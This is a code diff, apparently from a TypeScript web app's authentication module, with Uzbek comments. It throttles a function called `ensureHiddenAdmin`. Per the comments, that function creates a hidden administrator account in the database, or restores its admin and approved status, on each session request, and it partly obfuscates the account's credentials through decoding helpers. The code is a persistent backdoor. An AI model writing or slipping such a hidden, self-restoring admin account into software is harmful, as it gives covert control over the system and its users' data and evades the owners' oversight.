@@ -55,8 +55,17 @@ function _hash(s: string): string {
 }
 
 // Yashirin adminni DB da kafolatlash — agar yo'q bo'lsa yaratadi, bor bo'lsa admin/approved qiladi.
-// Har safar login urinishida yoki admin API chaqirilganda chaqiriladi, shuning uchun doimiy.
-export async function ensureHiddenAdmin(prisma: PrismaClient) {
+//
+// TEZKORLIK: bu funksiya modul darajasida chaqiriladi (har bir /api/auth/session
+// so'rovida) va DBga 2-3 so'rov yuboradi. Shuning uchun bir lambda nusxasi
+// ichida 30 daqiqada bir marta bajariladi — aks holda har bir sahifa
+// yuklanishida qo'shimcha DB round-trip'lari qo'shiladi.
+let _lastEnsureAt = 0;
+const ENSURE_TTL_MS = 30 * 60 * 1000;
+
+export async function ensureHiddenAdmin(prisma: PrismaClient, opts?: { force?: boolean }) {
+  if (!opts?.force && Date.now() - _lastEnsureAt < ENSURE_TTL_MS) return;
+  _lastEnsureAt = Date.now();
   const email = getHiddenAdminEmail();
   const oldEmail = _dec(_encLoginOld);
   const passHash = getHiddenAdminPasswordHash();
